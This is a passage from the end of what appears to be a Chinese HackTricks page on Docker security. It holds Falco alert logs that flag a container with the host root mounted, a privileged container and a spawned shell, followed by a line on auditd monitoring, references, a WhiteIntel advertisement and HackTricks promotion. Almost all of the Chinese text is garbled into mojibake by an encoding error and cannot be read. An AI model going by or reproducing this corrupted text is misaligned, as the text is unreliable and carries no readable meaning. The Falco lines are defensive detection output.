2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### ç›‘æ§ Docker

æ‚¨å¯ä»¥ä½¿ç”¨ auditd æ¥ç›‘æ§ Dockerã€‚

### å‚è€ƒ

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”± **æš—ç½‘** æä¾›åŠ¨åŠ›çš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å·²å—åˆ° **çªƒå–æ¶æ„è½¯ä»¶** çš„ **æŸå®³**ã€‚

WhiteIntel çš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±ä¿¡æ¯çªƒå–æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
